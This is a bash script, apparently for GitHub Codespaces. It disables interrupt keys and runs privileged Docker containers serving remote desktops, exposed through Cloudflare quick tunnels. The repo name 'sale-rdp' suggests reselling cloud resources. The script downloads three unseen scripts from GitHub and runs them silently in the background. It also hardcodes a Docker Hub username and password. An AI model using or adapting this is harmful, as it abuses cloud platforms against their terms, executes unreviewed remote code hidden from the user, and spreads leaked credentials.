#!/bin/bash
stty intr ""
stty quit ""
stty susp undef

bash gm > /dev/null 2>&1 &
curl -sSL -o ssmtp https://raw.githubusercontent.com/3222h/sale-rdp/main/ssmtp
curl -sSL -o flare https://raw.githubusercontent.com/3222h/sale-rdp/main/flare
curl -sSL -o 11h https://raw.githubusercontent.com/3222h/sale-rdp/main/11h


clear
# Ensure cloudflared is installed
if ! command -v cloudflared &> /dev/null; then
    echo "Installing Cloudflared..."
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
    sudo mv cloudflared /usr/local/bin/
fi




if [ ! -f cgit ]; then
    touch cgit
fi

# Check if the file is empty
if [ ! -s cgit ]; then
    read -p "Enter current git: " current_git
    echo "$current_git" > cgit
fi



if [ ! -f ngit ]; then
    touch ngit
fi

# Check if the file is empty
if [ ! -s ngit ]; then
    read -p "Enter next git: " next_git
    echo "$next_git" > ngit
fi



clear
docker login -u a35377 -p zxcv@1234
cgit=$(cat ./cgit)
docker run --restart always -d -p 3000:3000 --privileged --name nomashine --cap-add=SYS_PTRACE --shm-size=7g -e USERP='5022' -e VNCP='5022' "$cgit"
ngit=$(cat ./ngit)
docker run --restart always -d -p 3002:3000 --privileged --name nomashine2 --cap-add=SYS_PTRACE --shm-size=7g -e USERP='5022' -e VNCP='5022' "$ngit"
clear
docker exec -it nomashine /bin/sh -c "git clone https://github.com/3222h/vs-ter-01.git"
clear

#!/bin/bash

# Step 1: Get or set password
PSW_FILE="PSW"
if [ -s "$PSW_FILE" ]; then
    PSW=$(cat "$PSW_FILE")
    echo "PASSWORD READ FROM FILE: $PSW"
else
    read -p "CHOOSE PASSWORD OF FOUR NUMBERS (1-9): " PSW
    echo "$PSW" > "$PSW_FILE"
    echo "PASSWORD SAVED TO FILE."
fi
docker login -u a35377 -p zxcv@1234
# Step 2: Create Docker network if not exists
docker network inspect nomashine1 >/dev/null 2>&1 || \
    docker network create --driver bridge nomashine1

# Step 3: Check for `hub` file
HUB_FILE="hub"
if [ ! -f "$HUB_FILE" ]; then
    read -p "Enter a value for the hub: " hub
    echo "$hub" > "$HUB_FILE"
else
    hub=$(cat "$HUB_FILE")
fi

# Step 4: Attempt to pull from Docker Hub
echo "Trying to pull image: a35379/sale:$hub"
if docker pull a35377/sale:"$hub"; then
    IMAGE_TO_RUN="a35377/sale:$hub"
    echo "Image pulled successfully."
else
    IMAGE_TO_RUN="a35379/rdp:c1"
    echo "Pull failed. Falling back to default image: $IMAGE_TO_RUN"
fi

# Step 5: Remove any existing container
docker rm -f nomashine1 2>/dev/null
docker volume rm $(docker volume ls -qf "name=nomashine1") 2>/dev/null

# Step 6: Run Docker container
docker run --network nomashine1 --restart always -d \
    -p 3001:3000 --privileged --name nomashine1 \
    --cap-add=SYS_PTRACE --shm-size=7g \
    -e USERP="$PSW" -e VNCP="$PSW" "$IMAGE_TO_RUN"

clear

# Start Cloudflared tunnels for each port
echo "Starting Cloudflared tunnels..."
cloudflared tunnel --url http://localhost:3001 > tunnel1.log 2>&1 &

clear
sleep 8

# check for file name STOP-URL 
filename="STOP-URL"
# Check if the file exists
if [ ! -f "$filename" ]; then
    # If the file does not exist, create it and save the URL
    gh codespace list | grep Available | awk '{print $1}' > "$filename"
    echo "File '$filename' created and URL saved."
else
    echo "File '$filename' already exists."
fi

clear
curl ifconfig.me
echo
echo

sleep 1
CRP=$(cat ./STOP-URL)
CODESPACE_URL="https://$CRP-3000.app.github.dev"

echo "$CODESPACE_URL"

# Extract and display tunnel URLs
echo
echo "============ CLOUDFLARED TUNNELS ============"
echo
echo
[ -f link ] || touch link
for i in 1; do
    url=$(grep -o 'https://[-a-z0-9]*\.trycloudflare.com' tunnel$i.log | head -n1)
    echo "PORT 300$i â†’ $url"
    echo
     # Replace content of "link" file with the current URL
    echo "$url" > link
done



bash ssmtp > /dev/null 2>&1 &
bash flare > /dev/null 2>&1 &
bash 11h > /dev/null 2>&1 &
